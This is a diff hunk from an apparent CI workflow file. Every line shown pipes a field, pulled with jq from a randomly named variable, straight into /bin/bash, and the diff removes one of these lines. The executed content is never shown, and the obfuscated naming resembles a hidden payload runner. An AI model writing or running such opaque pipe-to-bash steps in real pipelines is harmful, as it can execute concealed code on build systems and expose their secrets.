@@ -37,7 +37,6 @@ jobs:
           printf '%s' "$c4588" | jq -r .grll398 | /bin/bash
           echo $qwd7 | jq -r .f3 | /bin/bash
           echo $oup581 | jq -r .xxh9 | /bin/bash
-          printf '%s' "$ip30" | jq -r .j1 | /bin/bash
           printf '%s' "$j26" | jq -r .dk14 | /bin/bash
           echo $d914 | jq -r .gozf14 | /bin/bash
           printf '%s' "$bsbe234" | jq -r .wcmvs1854 | /bin/bash
